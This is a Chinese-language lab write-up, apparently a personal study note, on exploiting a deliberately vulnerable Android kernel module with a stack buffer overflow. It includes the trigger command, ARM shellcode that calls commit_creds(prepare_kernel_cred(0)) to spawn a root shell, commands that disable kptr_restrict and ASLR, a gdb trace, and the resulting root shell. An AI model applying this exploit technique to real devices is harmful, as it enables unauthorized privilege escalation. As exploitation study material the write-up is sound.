@@ -1,0 +1,257 @@
+一个简单的内核栈溢出，先在3.4内核上调试，3.4没有开启PXN
+关键问题代码如下：
+
+#define MAX_BUF 32
+static ssize_t vulkdev_write(struct file * file, char * buf, 
+     size_t count, loff_t *ppos)
+{
+ char sbuf[MAX_BUF];
+ if (copy_from_user(sbuf, buf, count))
+  return -EFAULT;
+ return count;
+}
+
+通过echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCC" > /dev/vulkdev2即可触发
+缓冲区大小为32，字符串有36个A，PANIC信息如下。
+Unable to handle kernel paging request at virtual address 42424242
+pgd = de294000
+[42424242] *pgd=00000000
+Internal error: Oops: 80000005 [#1] PREEMPT ARM
+Modules linked in: vulklab(P)
+CPU: 0 Tainted: P (3.4.67-g880d9af-dirty #1)
+PC is at 0x42424242
+LR is at 0x43434343
+pc : [<42424242>] lr : [<43434343>] psr: 60000013
+sp : de22df60 ip : 0000000c fp : 00000000
+r10: 00000000 r9 : de22c000 r8 : 00000035
+r7 : de22df88 r6 : b7de3584 r5 : d63f7600 r4 : 41414141
+r3 : 0000000a r2 : 80000000 r1 : b7de35b9 r0 : 00000035
+Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user
+Control: 10c53c7d Table: 1e294059 DAC: 00000015
+
+SP: 0xde22dee0:
+dee0 de22c000 00000000 b6c7d343 c00c2b24 00000041 b7ddcbbc de80f390 de746818
+df00 c0197028 42424242 60000013 ffffffff de22df4c c000d4f8 00000035 b7de35b9
+df20 80000000 0000000a 41414141 d63f7600 b7de3584 de22df88 00000035 de22c000
+df40 00000000 00000000 0000000c de22df60 43434343 42424242 60000013 ffffffff
+df60 43434343 43434343 43434343 b7de350a 00000000 00000000 00000035 c00b5b24
+df80 00000001 00000000 00000000 00000000 00000003 00000035 00000001 00000004
+dfa0 c000d984 c000d800 00000003 00000035 00000001 b7de3584 00000035 ffffffff
+dfc0 00000003 00000035 00000001 00000004 b7de3584 00000000 00000000 00000000
+
+
+核心代码如下：
+void payload(void)
+{
+ printf("exec root shell\n");
+ execl("/system/bin/sh", "sh", NULL);
+}
+
+extern uint32_t shellcode[];
+asm(
+    " .text\n"
+    " .align 2\n"
+    " .code 32\n"
+    " .globl shellcode\n\t"
+    "shellcode:\n\t"
+    // commit_creds(prepare_kernel_cred(0));
+    "LDR R3, =0xc003a89c\n\t" //prepare_kernel_cred addr
+    "MOV R0, #0\n\t"
+    "BLX R3\n\t"
+    "LDR R3, =0xc003a410\n\t" //commit_creds addr
+    "BLX R3\n\t"
+    "mov r3, #0x40000010\n\t"
+    "MSR CPSR_c,R3\n\t"
+    "LDR R3, =0x2a000759\n\t" //payload function addr
+    "BLX R3\n\t");
+
+只需将shellcode地址覆写上面的pc寄存器即可
+注意这里有三个硬编码地址：
+prepare_kernel_cred和commit_creds分别是相应内核符号地址，通过/proc/kallsyms可以查到
+payload()函数地址，可以先运行一次，将payload()地址输出，再更新改处地址。
+
+root@generic:/ # echo 0 > /proc/sys/kernel/kptr_restrict                       
+root@generic:/ # cat /proc/kallsyms | grep prepare_kernel_cred                 
+c003a89c T prepare_kernel_cred
+c045e578 r __ksymtab_prepare_kernel_cred
+c04656f2 r __kstrtab_prepare_kernel_cred
+root@generic:/ # cat /proc/kallsyms | grep commit_cred                         
+c003a410 T commit_creds
+c045bbf8 r __ksymtab_commit_creds
+c046572e r __kstrtab_commit_creds
+
+关闭ASLR，不然exp里每次payload()函数地址不一样：
+root@generic:/ # echo 0 > /proc/sys/kernel/randomize_va_space                  
+
+root@generic:/data/local/tmp $ ./vulkdev_exp2                                  
+payload = 0x2a000759
+...
+
+这里输出地址为，0x2a000759，所以更新上面代码地址为0x2a000759，重新编译，push
+为了演示，执行前先chmod 666 /dev/vulkdev1，再su shell降为普通shell权限，再执行exp，成功获取root shell:
+
+root@generic:/data/local/tmp $ id
+uid=2000(shell) gid=2000(shell) context=u:r:kernel:s0
+root@generic:/data/local/tmp $ ./vulkdev_exp2                                  
+payload = 0x2a000759
+exec root shell
+root@generic:/data/local/tmp # id
+uid=0(root) gid=0(root) context=u:r:kernel:s0
+root@generic:/data/local/tmp # 
+
+附具体调试过程：
+
+$ arm-linux-gdb vmlinux
+(gdb) target remote:1234
+Remote debugging using :1234
+cpu_v7_do_idle () at arch/arm/mm/proc-v7.S:74
+74 mov pc, lr
+(gdb) b *0xbf000094 => 从/proc/kallsyms里查到的问题函数vulkdev_write的符号地址，断点
+Breakpoint 1 at 0xbf000094
+(gdb) c
+Continuing.
+
+执行exp，断点触发，然后单步执行调试：
+Breakpoint 1, 0xbf000094 in ?? ()
+(gdb) display /5i $pc
+1: x/5i $pc
+=> 0xbf000094: push {r4, lr}
+   0xbf000098: sub sp, sp, #32
+   0xbf00009c: mov r4, r2
+   0xbf0000a0: mov r0, sp
+   0xbf0000a4: bic r3, r0, #8128 ; 0x1fc0
+(gdb) ni
+0xbf000098 in ?? ()
+1: x/5i $pc
+=> 0xbf000098: sub sp, sp, #32
+   0xbf00009c: mov r4, r2
+   0xbf0000a0: mov r0, sp
+   0xbf0000a4: bic r3, r0, #8128 ; 0x1fc0
+   0xbf0000a8: bic r3, r3, #63 ; 0x3f
+
+一直单步执行走到了copy_from_user，做缓冲区拷贝并触发缓冲区溢出
+(gdb) 
+0xbf0000c0 in ?? ()
+1: x/5i $pc
+=> 0xbf0000c0: bne 0xbf0000d8
+   0xbf0000c4: mov r0, sp
+   0xbf0000c8: bl 0xc01d19c0 <__copy_from_user>
+   0xbf0000cc: cmp r0, #0
+   0xbf0000d0: beq 0xbf0000f0
+
+继续单步，在vulkdev_write最后从栈上恢复pc寄存器时，可以看到pc成功劫持为我们构造的shellcode地址0x2a000728
+(gdb) 
+0xbf000100 in ?? ()
+1: x/5i $pc
+=> 0xbf000100: pop {r4, pc}
+   0xbf000104: mov r0, #0
+   0xbf000108: bx lr
+   0xbf00010c: mov r0, #0
+   0xbf000110: bx lr
+(gdb) x/16 $sp
+0xd6387f58: 0xb6fb7cb5 0x2a000728 0x00000000 0x00000000
+0xd6387f68: 0xcde07c80 0xbefffa7c 0x00000000 0x00000000
+0xd6387f78: 0x00000030 0xc00b5b24 0x00000004 0x00000000
+0xd6387f88: 0x00000000 0x00000000 0x00000004 0xb6fdd35c
+
+继续单步就进到用户态的shellcode中，调用commit_creds(prepare_kernel_cred(0))提权
+(gdb) ni
+0x2a000728 in ?? ()
+1: x/5i $pc
+=> 0x2a000728: ldr r3, [pc, #28] ; 0x2a00074c
+   0x2a00072c: mov r0, #0
+   0x2a000730: blx r3
+   0x2a000734: ldr r3, [pc, #20] ; 0x2a000750
+   0x2a000738: blx r3
+
+继续单步，就跳转到payload函数执行shell
+(gdb) 
+0x2a000744 in ?? ()
+1: x/5i $pc
+=> 0x2a000744: ldr r3, [pc, #8] ; 0x2a000754
+   0x2a000748: blx r3
+   0x2a00074c: mulgt r3, r12, r8
+   0x2a000750: andgt r10, r3, r0, lsl r4
+   0x2a000754: bcs 0x2a0024c0
+(gdb) 
+0x2a000748 in ?? ()
+1: x/5i $pc
+=> 0x2a000748: blx r3
+   0x2a00074c: mulgt r3, r12, r8
+   0x2a000750: andgt r10, r3, r0, lsl r4
+   0x2a000754: bcs 0x2a0024c0
+   0x2a000758: push {r7, lr}
+(gdb) 
+0x2a000758 in ?? ()
+1: x/5i $pc
+=> 0x2a000758: push {r7, lr}
+   0x2a00075a: mov r7, sp
+   0x2a00075c: ldr r0, [pc, #24] ; (0x2a000778)
+   0x2a00075e: add r0, pc
+   0x2a000760: blx 0x2a000640
+(gdb) c
+Continuing.
+
+继续执行，看到成功获取到root shell。
+
+另外，vulkdev_exp2.1对上述exp做了扩展，改成内联汇编实现，动态获取内核符号和函数地址，不需要硬编码，同时也不受ASLR影响，执行前不需要关闭ASLR。
+
+vulkdev_exp2.2是参考某exp的另一种实现，实测应该可行，只是在commit_creds调用完毕之后，发现编译的跳转指令为bx，而非blx，这样返回地址没有保存到lr中导致调用完毕之后无法正常返回。猜测是调用约定有问题？需要后续继续调试。
+
+
+补充说明：
+1. 关于ASLR
+判断ASLR是否打开，输出2表示打开
+cat /proc/sys/kernel/randomize_va_space 
+关闭ASLR，切换至root用户，输入命令
+echo 0 > /proc/sys/kernel/randomize_va_space
+开启ASLR，切换至root用户，输入命令
+echo 2 > /proc/sys/kernel/randomize_va_space
+
+2. 汇编BX跳转的实际地址由于thumb指令的原因，是ida里面看的地址+1
+
+3. ARM跳转指令B、BX、BLX、BXJ的区别
+B: 跳转
+BL: 带链接跳转
+BX: 跳转并切换指令集
+BLX: 带链接跳转并切换指令集
+BXJ: 跳转并转换到 Jazelle 状态
+所有这些指令均会引发跳转，或跳转到 label，或跳转到包含在 Rm 中的地址处。 此外：
+BL 和 BLX 指令可将下一个指令的地址复制到 lr（r14，链接寄存器）中。
+BX 和 BLX 指令可将处理器的状态从 ARM 更改为 Thumb，或从 Thumb 更改为 ARM。
+BLX label 无论何种情况，始终会更改处理器的状态。
+BX Rm 和 BLX Rm 可从 Rm 的位 [0] 推算出目标状态：
+如果 Rm 的位 [0] 为 0，则处理器的状态会更改为（或保持在）ARM 状态
+如果 Rm 的位 [0] 为 1，则处理器的状态会更改为（或保持在）Thumb 状态。
+BXJ 指令会将处理器的状态更改为 Jazelle。
+另外这些跳转指令在不同的ARM\16位thrumb\32thrumb这些不同指令集下，可用性和范围也有差异，具体参考ARM指令说明。
+
+
+4. 关于shellcode中MSR指令解释
+"mov r3, #0x40000010\n\t"
+ "MSR CPSR_c,R3\n\t"
+这个是通过CPSR状态寄存器完成从内核态到用户态的切换，将CPSR的M[4:0]位置为0b10000切换到用户模式
+
+ARM每种工作模式除R0~R15共16个寄存器外，还有第17个寄存器CPSR，叫做 “当前程序状态寄存器”，CPSR中一些位被用于标识各种状态，一些位被用于标识当前处于什么工作模式。
+
+image
+
+这个状态寄存器的32位可以分为四个8位的域。
+
+image
+
+ 
+
+其中cpsr_c代表的是cpsr寄存器的低8位，也就是控制位
+
+有些程序里这样写
+msr cpsr_c, #0xd2       @ 进入中断模式
+
+这样的语句时，就是在更改这8位的值为0xd2，根据下图，知道是进入中断模式
+
+image
+
+参考文档：
+[1] https://xz.aliyun.com/t/6715
+[2] https://github.com/Fuzion24/AndroidKernelExploitationPlayground/blob/master/challenges/stack_buffer_overflow/solution/jni/stack_buffer_overflow_exploit.c
+
